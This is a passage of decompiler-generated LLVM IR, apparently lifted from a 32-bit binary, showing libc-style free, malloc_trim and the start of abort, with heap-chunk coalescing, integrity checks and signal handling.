; uselistorder directives
  uselistorder i32 %v0_8053d21, { 1, 0 }
  uselistorder i32 %v0_8053ce0, { 1, 0 }
  uselistorder i32 %v1_8053c9b, { 1, 0 }
  uselistorder i32 %v2_8053c94, { 1, 0 }
  uselistorder i32 %v1_8053c8c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053c98, { 1, 0 }
  uselistorder i32 %v3_8053c47, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8053c64, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053c41, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8053cf2, { 1, 0 }
  uselistorder i32 %v1_8053c0c, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8053d89, { 1, 0 }
  uselistorder label %dec_label_pc_8053d15, { 1, 0 }
  uselistorder label %dec_label_pc_8053cf5, { 1, 0 }
  uselistorder label %dec_label_pc_8053cc1, { 1, 0 }
  uselistorder label %dec_label_pc_8053cb9, { 1, 0 }
  uselistorder label %dec_label_pc_8053c84, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053d91 = load i32, i32* @ebp, align 4
  %v0_8053d92 = load i32, i32* @edi, align 4
  %v0_8053d93 = load i32, i32* @esi, align 4
  %v0_8053d94 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053d9c = icmp eq i32 %arg1, 0
  br i1 %v1_8053d9c, label %dec_label_pc_8053f25, label %dec_label_pc_8053da4

dec_label_pc_8053da4:                             ; preds = %entry
  %v2_8053daf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053daf, i32* @eax, align 4
  %v2_8053db4 = call i32 @__pthread_return_void(i32 %v2_8053daf, i32 134564427)
  store i32 %v2_8053db4, i32* %eax.global-to-local, align 4
  %v1_8053dc0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f770.957 to i32))
  %v1_8053dc5 = add i32 %arg1, -8
  store i32 %v1_8053dc5, i32* @ecx, align 4
  %v0_8053dc8 = load i8, i8* @global_var_8065be0.958, align 1
  %v1_8053dc8 = sext i8 %v0_8053dc8 to i32
  store i32 %v1_8053dc8, i32* %eax.global-to-local, align 4
  %v1_8053dd0 = add i32 %arg1, -4
  %v2_8053dd0 = inttoptr i32 %v1_8053dd0 to i32*
  %v3_8053dd0 = load i32, i32* %v2_8053dd0, align 4
  %v1_8053dd5 = and i32 %v3_8053dd0, -4
  %v4_8053dd5 = trunc i32 %v1_8053dd5 to i8
  store i32 %v1_8053dd5, i32* @ebx, align 4
  %v8_8053dda = icmp ugt i8 %v4_8053dd5, %v0_8053dc8
  br i1 %v8_8053dda, label %dec_label_pc_8053dfc, label %dec_label_pc_8053ddc

dec_label_pc_8053ddc:                             ; preds = %dec_label_pc_8053da4
  %v2_8053ddc = udiv i32 %v3_8053dd0, 8
  %v1_8053ddf = or i32 %v1_8053dc8, 3
  %v3_8053ddf = trunc i32 %v1_8053ddf to i8
  store i32 %v1_8053ddf, i32* %eax.global-to-local, align 4
  store i8 %v3_8053ddf, i8* @global_var_8065be0.958, align 32
  %v1_8053de7 = mul nuw i32 %v2_8053ddc, 4
  %v2_8053de7 = add i32 %v1_8053de7, ptrtoint (i8* @global_var_8065be0.958 to i32)
  store i32 %v2_8053de7, i32* @edx, align 4
  %v1_8053dee = add i32 %v1_8053de7, add (i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32 -4)
  %v2_8053dee = inttoptr i32 %v1_8053dee to i32*
  %v3_8053dee = load i32, i32* %v2_8053dee, align 4
  store i32 %v3_8053dee, i32* %eax.global-to-local, align 4
  %v3_8053df1 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8053dee, i32* %v3_8053df1, align 4
  %v0_8053df4 = load i32, i32* @ecx, align 4
  %v1_8053df4 = load i32, i32* @edx, align 4
  %v2_8053df4 = add i32 %v1_8053df4, -4
  %v3_8053df4 = inttoptr i32 %v2_8053df4 to i32*
  store i32 %v0_8053df4, i32* %v3_8053df4, align 4
  br label %dec_label_pc_8053f14

dec_label_pc_8053dfc:                             ; preds = %dec_label_pc_8053da4
  %v1_8053dfc = trunc i32 %v3_8053dd0 to i8
  %v2_8053dfc = and i8 %v1_8053dfc, 2
  %v3_8053dfc = icmp eq i8 %v2_8053dfc, 0
  %v5_8053dfc = zext i8 %v2_8053dfc to i32
  %v7_8053dfc = and i32 %v3_8053dd0, -256
  %v8_8053dfc = or i32 %v5_8053dfc, %v7_8053dfc
  store i32 %v8_8053dfc, i32* @edx, align 4
  %v1_8053dff = icmp eq i1 %v3_8053dfc, false
  br i1 %v1_8053dff, label %dec_label_pc_8053ef4, label %dec_label_pc_8053e05

dec_label_pc_8053e05:                             ; preds = %dec_label_pc_8053dfc
  %v1_8053e05 = or i32 %v1_8053dc8, 1
  %v3_8053e05 = trunc i32 %v1_8053e05 to i8
  store i32 %v1_8053e05, i32* %eax.global-to-local, align 4
  %v2_8053e08 = add i32 %v1_8053dd5, %v1_8053dc5
  store i32 %v2_8053e08, i32* @esi, align 4
  store i8 %v3_8053e05, i8* @global_var_8065be0.958, align 32
  %v1_8053e10 = add i32 %v2_8053e08, 4
  %v2_8053e10 = inttoptr i32 %v1_8053e10 to i32*
  %v3_8053e10 = load i32, i32* %v2_8053e10, align 4
  store i32 %v3_8053e10, i32* %eax.global-to-local, align 4
  %v2_8053e17 = inttoptr i32 %v1_8053dd0 to i8*
  %v3_8053e17 = load i8, i8* %v2_8053e17, align 1
  %v4_8053e17 = urem i8 %v3_8053e17, 2
  %v5_8053e17 = icmp eq i8 %v4_8053e17, 0
  %v1_8053e1b = icmp eq i1 %v5_8053e17, false
  br i1 %v1_8053e1b, label %dec_label_pc_8053e3e, label %dec_label_pc_8053e1d

dec_label_pc_8053e1d:                             ; preds = %dec_label_pc_8053e05
  %v2_8053e1d = inttoptr i32 %v1_8053dc5 to i32*
  %v3_8053e1d = load i32, i32* %v2_8053e1d, align 4
  store i32 %v3_8053e1d, i32* @ebp, align 4
  %v2_8053e22 = sub i32 %v1_8053dc5, %v3_8053e1d
  store i32 %v2_8053e22, i32* %eax.global-to-local, align 4
  %v1_8053e24 = add i32 %v2_8053e22, 8
  %v2_8053e24 = inttoptr i32 %v1_8053e24 to i32*
  %v3_8053e24 = load i32, i32* %v2_8053e24, align 4
  store i32 %v3_8053e24, i32* @edi, align 4
  %v1_8053e27 = add i32 %v2_8053e22, 12
  %v2_8053e27 = inttoptr i32 %v1_8053e27 to i32*
  %v3_8053e27 = load i32, i32* %v2_8053e27, align 4
  store i32 %v3_8053e27, i32* @edx, align 4
  %v1_8053e2a = add i32 %v3_8053e24, 12
  %v2_8053e2a = inttoptr i32 %v1_8053e2a to i32*
  %v3_8053e2a = load i32, i32* %v2_8053e2a, align 4
  store i32 %v3_8053e2a, i32* @ecx, align 4
  %v12_8053e2d = icmp eq i32 %v3_8053e2a, %v2_8053e22
  %v1_8053e2f = icmp eq i1 %v12_8053e2d, false
  br i1 %v1_8053e2f, label %dec_label_pc_8053e6d, label %dec_label_pc_8053e31

dec_label_pc_8053e31:                             ; preds = %dec_label_pc_8053e1d
  %v1_8053e31 = add i32 %v3_8053e27, 8
  %v2_8053e31 = inttoptr i32 %v1_8053e31 to i32*
  %v3_8053e31 = load i32, i32* %v2_8053e31, align 4
  %v15_8053e31 = icmp eq i32 %v3_8053e31, %v3_8053e2a
  %v1_8053e34 = icmp eq i1 %v15_8053e31, false
  br i1 %v1_8053e34, label %dec_label_pc_8053e6d, label %dec_label_pc_8053e36

dec_label_pc_8053e36:                             ; preds = %dec_label_pc_8053e31
  %v2_8053e36 = add i32 %v3_8053e1d, %v1_8053dd5
  store i32 %v2_8053e36, i32* @ebx, align 4
  store i32 %v3_8053e27, i32* %v2_8053e2a, align 4
  %v0_8053e3b = load i32, i32* @edi, align 4
  %v1_8053e3b = load i32, i32* @edx, align 4
  %v2_8053e3b = add i32 %v1_8053e3b, 8
  %v3_8053e3b = inttoptr i32 %v2_8053e3b to i32*
  store i32 %v0_8053e3b, i32* %v3_8053e3b, align 4
  %v0_8053e45.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053e3e

dec_label_pc_8053e3e:                             ; preds = %dec_label_pc_8053e05, %dec_label_pc_8053e36
  %v1_8053e51 = phi i32 [ %v2_8053e08, %dec_label_pc_8053e05 ], [ %v0_8053e45.pre, %dec_label_pc_8053e36 ]
  %v1_8053e42 = and i32 %v3_8053e10, -4
  store i32 %v1_8053e42, i32* @ebp, align 4
  %v1_8053e45 = load i32, i32* @global_var_8065c0c.959, align 4
  %v12_8053e45 = icmp eq i32 %v1_8053e51, %v1_8053e45
  br i1 %v12_8053e45, label %dec_label_pc_8053e9f, label %dec_label_pc_8053e4d

dec_label_pc_8053e4d:                             ; preds = %dec_label_pc_8053e3e
  %v2_8053e4d = add i32 %v1_8053e51, 4
  %v3_8053e4d = add i32 %v2_8053e4d, %v1_8053e42
  %v4_8053e4d = inttoptr i32 %v3_8053e4d to i32*
  %v5_8053e4d = load i32, i32* %v4_8053e4d, align 4
  store i32 %v5_8053e4d, i32* %eax.global-to-local, align 4
  %v3_8053e51 = inttoptr i32 %v2_8053e4d to i32*
  store i32 %v1_8053e42, i32* %v3_8053e51, align 4
  %v0_8053e54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e54 = urem i32 %v0_8053e54, 2
  %v2_8053e54 = icmp eq i32 %v1_8053e54, 0
  store i32 %v1_8053e54, i32* %eax.global-to-local, align 4
  %v1_8053e59 = icmp eq i1 %v2_8053e54, false
  br i1 %v1_8053e59, label %dec_label_pc_8053e7a, label %dec_label_pc_8053e5b

dec_label_pc_8053e5b:                             ; preds = %dec_label_pc_8053e4d
  %v0_8053e5b = load i32, i32* @esi, align 4
  %v1_8053e5b = add i32 %v0_8053e5b, 8
  %v2_8053e5b = inttoptr i32 %v1_8053e5b to i32*
  %v3_8053e5b = load i32, i32* %v2_8053e5b, align 4
  store i32 %v3_8053e5b, i32* @edx, align 4
  %v1_8053e5e = add i32 %v0_8053e5b, 12
  %v2_8053e5e = inttoptr i32 %v1_8053e5e to i32*
  %v3_8053e5e = load i32, i32* %v2_8053e5e, align 4
  store i32 %v3_8053e5e, i32* %eax.global-to-local, align 4
  %v1_8053e61 = add i32 %v3_8053e5b, 12
  %v2_8053e61 = inttoptr i32 %v1_8053e61 to i32*
  %v3_8053e61 = load i32, i32* %v2_8053e61, align 4
  store i32 %v3_8053e61, i32* @edi, align 4
  %v12_8053e64 = icmp eq i32 %v3_8053e61, %v0_8053e5b
  %v1_8053e66 = icmp eq i1 %v12_8053e64, false
  br i1 %v1_8053e66, label %dec_label_pc_8053e6d, label %dec_label_pc_8053e68

dec_label_pc_8053e68:                             ; preds = %dec_label_pc_8053e5b
  %v1_8053e68 = add i32 %v3_8053e5e, 8
  %v2_8053e68 = inttoptr i32 %v1_8053e68 to i32*
  %v3_8053e68 = load i32, i32* %v2_8053e68, align 4
  %v15_8053e68 = icmp eq i32 %v3_8053e68, %v3_8053e61
  br i1 %v15_8053e68, label %dec_label_pc_8053e72, label %dec_label_pc_8053e6d

dec_label_pc_8053e6d:                             ; preds = %dec_label_pc_8053e68, %dec_label_pc_8053e5b, %dec_label_pc_8053e31, %dec_label_pc_8053e1d
  %v0_8053e6d = call i32 @abort()
  store i32 %v0_8053e6d, i32* %eax.global-to-local, align 4
  %v1_8053e72.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053e72

dec_label_pc_8053e72:                             ; preds = %dec_label_pc_8053e68, %dec_label_pc_8053e6d
  %v1_8053e72 = phi i32 [ %v3_8053e5b, %dec_label_pc_8053e68 ], [ %v1_8053e72.pre, %dec_label_pc_8053e6d ]
  %v0_8053e72 = phi i32 [ %v3_8053e5e, %dec_label_pc_8053e68 ], [ %v0_8053e6d, %dec_label_pc_8053e6d ]
  %v2_8053e72 = add i32 %v1_8053e72, 12
  %v3_8053e72 = inttoptr i32 %v2_8053e72 to i32*
  store i32 %v0_8053e72, i32* %v3_8053e72, align 4
  %v0_8053e75 = load i32, i32* @edx, align 4
  %v1_8053e75 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053e75 = add i32 %v1_8053e75, 8
  %v3_8053e75 = inttoptr i32 %v2_8053e75 to i32*
  store i32 %v0_8053e75, i32* %v3_8053e75, align 4
  %v0_8053e78 = load i32, i32* @ebx, align 4
  %v1_8053e78 = load i32, i32* @ebp, align 4
  %v2_8053e78 = add i32 %v1_8053e78, %v0_8053e78
  store i32 %v2_8053e78, i32* @ebx, align 4
  br label %dec_label_pc_8053e7a

dec_label_pc_8053e7a:                             ; preds = %dec_label_pc_8053e4d, %dec_label_pc_8053e72
  %v0_8053e7a = load i32, i32* @global_var_8065c1c.977, align 4
  store i32 %v0_8053e7a, i32* %eax.global-to-local, align 4
  %v0_8053e7f = load i32, i32* @ecx, align 4
  %v1_8053e7f = add i32 %v0_8053e7f, 12
  %v2_8053e7f = inttoptr i32 %v1_8053e7f to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v2_8053e7f, align 4
  %v0_8053e86 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e86 = load i32, i32* @ecx, align 4
  %v2_8053e86 = add i32 %v1_8053e86, 8
  %v3_8053e86 = inttoptr i32 %v2_8053e86 to i32*
  store i32 %v0_8053e86, i32* %v3_8053e86, align 4
  %v0_8053e89 = load i32, i32* @ebx, align 4
  %v1_8053e89 = load i32, i32* @ecx, align 4
  %v3_8053e89 = add i32 %v1_8053e89, %v0_8053e89
  %v4_8053e89 = inttoptr i32 %v3_8053e89 to i32*
  store i32 %v0_8053e89, i32* %v4_8053e89, align 4
  %v0_8053e8c = load i32, i32* @ecx, align 4
  %v1_8053e8c = load i32, i32* %eax.global-to-local, align 4
  %v2_8053e8c = add i32 %v1_8053e8c, 12
  %v3_8053e8c = inttoptr i32 %v2_8053e8c to i32*
  store i32 %v0_8053e8c, i32* %v3_8053e8c, align 4
  %v0_8053e8f = load i32, i32* @ebx, align 4
  %v1_8053e91 = or i32 %v0_8053e8f, 1
  store i32 %v1_8053e91, i32* %eax.global-to-local, align 4
  %v0_8053e94 = load i32, i32* @ecx, align 4
  store i32 %v0_8053e94, i32* @global_var_8065c1c.977, align 4
  %v2_8053e9a = add i32 %v0_8053e94, 4
  %v3_8053e9a = inttoptr i32 %v2_8053e9a to i32*
  store i32 %v1_8053e91, i32* %v3_8053e9a, align 4
  br label %dec_label_pc_8053eaf

dec_label_pc_8053e9f:                             ; preds = %dec_label_pc_8053e3e
  %v0_8053e9f = load i32, i32* @ebx, align 4
  %v2_8053e9f = add i32 %v0_8053e9f, %v1_8053e42
  store i32 %v2_8053e9f, i32* @ebx, align 4
  %v1_8053ea3 = or i32 %v2_8053e9f, 1
  store i32 %v1_8053ea3, i32* %eax.global-to-local, align 4
  %v1_8053ea6 = load i32, i32* @ecx, align 4
  %v2_8053ea6 = add i32 %v1_8053ea6, 4
  %v3_8053ea6 = inttoptr i32 %v2_8053ea6 to i32*
  store i32 %v1_8053ea3, i32* %v3_8053ea6, align 4
  %v0_8053ea9 = load i32, i32* @ecx, align 4
  store i32 %v0_8053ea9, i32* @global_var_8065c0c.959, align 4
  br label %dec_label_pc_8053eaf

dec_label_pc_8053eaf:                             ; preds = %dec_label_pc_8053e7a, %dec_label_pc_8053e9f
  %v0_8053eaf = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053eaf, 131072
  br i1 %tmp21, label %dec_label_pc_8053f14, label %dec_label_pc_8053eb7

dec_label_pc_8053eb7:                             ; preds = %dec_label_pc_8053eaf
  %v0_8053eb7 = load i8, i8* @global_var_8065be0.958, align 32
  %v1_8053eb7 = and i8 %v0_8053eb7, 2
  %v2_8053eb7 = icmp eq i8 %v1_8053eb7, 0
  br i1 %v2_8053eb7, label %dec_label_pc_8053ed0, label %dec_label_pc_8053ec0

dec_label_pc_8053ec0:                             ; preds = %dec_label_pc_8053eb7
  %v2_8053ec8 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065be0.958 to i32*))
  store i32 %v2_8053ec8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ed0

dec_label_pc_8053ed0:                             ; preds = %dec_label_pc_8053eb7, %dec_label_pc_8053ec0
  %v0_8053ed0 = load i32, i32* @global_var_8065c0c.959, align 4
  store i32 %v0_8053ed0, i32* %eax.global-to-local, align 4
  %v1_8053ed5 = add i32 %v0_8053ed0, 4
  %v2_8053ed5 = inttoptr i32 %v1_8053ed5 to i32*
  %v3_8053ed5 = load i32, i32* %v2_8053ed5, align 4
  %v1_8053ed8 = and i32 %v3_8053ed5, -4
  store i32 %v1_8053ed8, i32* %eax.global-to-local, align 4
  %v1_8053edb = load i32, i32* @global_var_8065f24.975, align 4
  %v7_8053edb = icmp ult i32 %v1_8053ed8, %v1_8053edb
  br i1 %v7_8053edb, label %dec_label_pc_8053f14, label %dec_label_pc_8053ee3

dec_label_pc_8053ee3:                             ; preds = %dec_label_pc_8053ed0
  store i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32* @edx, align 4
  %v0_8053ee8 = load i32, i32* @global_var_8065f28.973, align 8
  store i32 %v0_8053ee8, i32* @eax, align 4
  %v0_8053eed = call i32 @__malloc_trim()
  store i32 %v0_8053eed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f14

dec_label_pc_8053ef4:                             ; preds = %dec_label_pc_8053dfc
  %v2_8053ef4 = inttoptr i32 %v1_8053dc5 to i32*
  %v3_8053ef4 = load i32, i32* %v2_8053ef4, align 4
  %v0_8053ef7 = load i32, i32* @global_var_8065f30.966, align 16
  %v1_8053ef7 = add i32 %v0_8053ef7, -1
  store i32 %v1_8053ef7, i32* @global_var_8065f30.966, align 16
  %v2_8053efd = add i32 %v3_8053ef4, %v1_8053dd5
  store i32 %v2_8053efd, i32* %eax.global-to-local, align 4
  %v2_8053f00 = sub i32 %v1_8053dc5, %v3_8053ef4
  %v0_8053f06 = load i32, i32* @global_var_8065f44.969, align 4
  %v2_8053f06 = sub i32 %v0_8053f06, %v2_8053efd
  store i32 %v2_8053f06, i32* @global_var_8065f44.969, align 4
  %v4_8053f0c = call i32 @munmap(i32 %v2_8053f00, i32 %v2_8053efd, i32 %v1_8053dd5, i32 %v1_8053dd5)
  store i32 %v4_8053f0c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f14

dec_label_pc_8053f14:                             ; preds = %dec_label_pc_8053ed0, %dec_label_pc_8053eaf, %dec_label_pc_8053ee3, %dec_label_pc_8053ddc, %dec_label_pc_8053ef4
  store i32 %v2_8053daf, i32* @eax, align 4
  %v2_8053f1d = call i32 @__pthread_return_void(i32 %v2_8053daf, i32 1)
  store i32 %v2_8053f1d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f25

dec_label_pc_8053f25:                             ; preds = %entry, %dec_label_pc_8053f14
  %.0 = phi i32 [ undef, %entry ], [ %v2_8053f1d, %dec_label_pc_8053f14 ]
  store i32 %v0_8053d94, i32* @ebx, align 4
  store i32 %v0_8053d93, i32* @esi, align 4
  store i32 %v0_8053d92, i32* @edi, align 4
  store i32 %v0_8053d91, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053ef4, { 1, 0 }
  uselistorder i32 %v0_8053e89, { 1, 0 }
  uselistorder i32 %v1_8053e54, { 1, 0 }
  uselistorder i32 %v2_8053e4d, { 1, 0 }
  uselistorder i32 %v1_8053e42, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053e51, { 1, 0 }
  uselistorder i32 %v1_8053dd5, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053dd0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8053dc5, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8065be0.958 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8065c14.961 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8065c0c.959, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053f25, { 1, 0 }
  uselistorder label %dec_label_pc_8053f14, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053ed0, { 1, 0 }
  uselistorder label %dec_label_pc_8053eaf, { 1, 0 }
  uselistorder label %dec_label_pc_8053e7a, { 1, 0 }
  uselistorder label %dec_label_pc_8053e72, { 1, 0 }
  uselistorder label %dec_label_pc_8053e3e, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8053f2d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8053f3a = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8065be0.958 to i8) to i32) to i32*))
  %v0_8053f3f = load i32, i32* @ebx, align 4
  store i32 %v0_8053f3f, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32* @edx, align 4
  store i32 %v0_8053f2d, i32* @ebx, align 4
  %v0_8053f4a = call i32 @__malloc_trim()
  ret i32 %v0_8053f4a

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8065be0.958 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8065be0.958, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053f5c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f788.978 to i32))
  %v12_8053f66 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f6b

dec_label_pc_8053f6b:                             ; preds = %dec_label_pc_8053f6b.dec_label_pc_8053f6b_crit_edge, %entry
  %v0_8053f6b = phi i32 [ %v12_8053f66, %entry ], [ %v0_8053f6b.pre, %dec_label_pc_8053f6b.dec_label_pc_8053f6b_crit_edge ]
  %v1_8053f7622 = phi i32 [ 31, %entry ], [ %v1_8053f76, %dec_label_pc_8053f6b.dec_label_pc_8053f6b_crit_edge ]
  %v2_8053f6b = mul i32 %v1_8053f7622, 4
  %v3_8053f6b = add i32 %v2_8053f6b, 152
  %v4_8053f6b = add i32 %v3_8053f6b, %v0_8053f6b
  %v5_8053f6b = inttoptr i32 %v4_8053f6b to i32*
  store i32 0, i32* %v5_8053f6b, align 4
  %v0_8053f76.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f76 = add i32 %v0_8053f76.pre, -1
  %v9_8053f76 = icmp slt i32 %v1_8053f76, 0
  store i32 %v1_8053f76, i32* %eax.global-to-local, align 4
  %v1_8053f77 = icmp eq i1 %v9_8053f76, false
  br i1 %v1_8053f77, label %dec_label_pc_8053f6b.dec_label_pc_8053f6b_crit_edge, label %dec_label_pc_8053f79

dec_label_pc_8053f6b.dec_label_pc_8053f6b_crit_edge: ; preds = %dec_label_pc_8053f6b
  %v0_8053f6b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053f6b

dec_label_pc_8053f79:                             ; preds = %dec_label_pc_8053f6b
  %v0_8053f79 = load i32, i32* @ebx, align 4
  %v2_8053f7d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053f7d, i32* @ebx, align 4
  %v4_8053f85 = call i32 @__sigaddset(i32 %v2_8053f7d, i32 6, i32 %v0_8053f79, i32 %v0_8053f79)
  store i32 %v4_8053f85, i32* %eax.global-to-local, align 4
  %v1_8053f8d = icmp eq i32 %v4_8053f85, 0
  %v1_8053f8f = icmp eq i1 %v1_8053f8d, false
  br i1 %v1_8053f8f, label %dec_label_pc_8053f9f, label %dec_label_pc_8053f91

dec_label_pc_8053f91:                             ; preds = %dec_label_pc_8053f79
  %v3_8053f97 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053f97 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8053f97, i32 0)
  store i32 %v4_8053f97, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f9f

dec_label_pc_8053f9f:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f91
  %v2_8053fd74 = phi i32 [ %v4_8053f85, %dec_label_pc_8053f79 ], [ %v4_8053f97, %dec_label_pc_8053f91 ]
  %v0_8053f9f = load i8, i8* @global_var_8065b00.979, align 256
  %v1_8053f9f = icmp eq i8 %v0_8053f9f, 0
  %v1_8053fa6 = icmp eq i1 %v1_8053f9f, false
  br i1 %v1_8053fa6, label %dec_label_pc_8053fd7, label %dec_label_pc_8053fa8

dec_label_pc_8053fa8:                             ; preds = %dec_label_pc_8053f9f
  store i8 1, i8* @global_var_8065b00.979, align 256
  br label %dec_label_pc_8053faf

dec_label_pc_8053faf:                             ; preds = %dec_label_pc_8054016, %dec_label_pc_8053fa8
  %v1_8053fb7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f788.978 to i32))
  store i32 %v1_8053fb7, i32* %eax.global-to-local, align 4
  %v1_8053fc3 = call i32 @__raise(i32 6)
  store i32 %v1_8053fc3, i32* %eax.global-to-local, align 4
  %v1_8053fcf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f788.978 to i32))
  store i32 %v1_8053fcf, i32* %eax.global-to-local, align 4
  %v0_8053fd7.pre = load i8, i8* @global_var_8065b00.979, align 256
  br label %dec_label_pc_8053fd7

dec_label_pc_8053fd7:                             ; preds = %dec_label_pc_8053f9f, %dec_label_pc_8053faf
  %v2_8053fd7 = phi i32 [ %v2_8053fd74, %dec_label_pc_8053f9f ], [ %v1_8053fcf, %dec_label_pc_8053faf ]
  %v0_8053fd7 = phi i8 [ %v0_8053f9f, %dec_label_pc_8053f9f ], [ %v0_8053fd7.pre, %dec_label_pc_8053faf ]
  %v1_8053fd7 = zext i8 %v0_8053fd7 to i32
  %v3_8053fd7 = and i32 %v2_8053fd7, -256
  %v4_8053fd7 = or i32 %v1_8053fd7, %v3_8053fd7
  store i32 %v4_8053fd7, i32* %eax.global-to-local, align 4
  %v10_8053fdc = icmp eq i8 %v0_8053fd7, 1
  %v1_8053fde = icmp eq i1 %v10_8053fdc, false
  br i1 %v1_8053fde, label %dec_label_pc_8054038, label %dec_label_pc_8053fe0

dec_label_pc_8053fe0:                             ; preds = %dec_label_pc_8053fd7
  store i8 2, i8* @global_var_8065b00.979, align 256
  %v2_8053fef = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8053fef, i32* %eax.global-to-local, align 4
  %v3_8053ff4 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053ff4 = call i32 @__GI_memset(i8* %v3_8053ff4, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805400b

dec_label_pc_805400b:                             ; preds = %dec_label_pc_805400b.dec_label_pc_805400b_crit_edge, %dec_label_pc_8053fe0
  %v0_805400b = phi i32 [ %v12_8053f66, %dec_label_pc_8053fe0 ], [ %v0_805400b.pre, %dec_label_pc_805400b.dec_label_pc_805400b_crit_edge ]
  %v1_805401321 = phi i32 [ 31, %dec_label_pc_8053fe0 ], [ %v1_8054013, %dec_label_pc_805400b.dec_label_pc_805400b_crit_edge ]
  %v2_805400b = mul i32 %v1_805401321, 4
  %v3_805400b = add i32 %v2_805400b, 16
  %v4_805400b = add i32 %v3_805400b, %v0_805400b
  %v5_805400b = inttoptr i32 %v4_805400b to i32*
  store i32 -1, i32* %v5_805400b, align 4
  %v0_8054013.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054013 = add i32 %v0_8054013.pre, -1
  %v9_8054013 = icmp slt i32 %v1_8054013, 0
  store i32 %v1_8054013, i32* %eax.global-to-local, align 4
  %v1_8054014 = icmp eq i1 %v9_8054013, false
  br i1 %v1_8054014, label %dec_label_pc_805400b.dec_label_pc_805400b_crit_edge, label %dec_label_pc_8054016

dec_label_pc_805400b.dec_label_pc_805400b_crit_edge: ; preds = %dec_label_pc_805400b
  %v0_805400b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805400b

dec_label_pc_8054016:                             ; preds = %dec_label_pc_805400b
  store i32 %v2_8053fef, i32* %eax.global-to-local, align 4
  %v4_805402b = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805402b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053faf

dec_label_pc_8054038:                             ; preds = %dec_label_pc_8053fd7
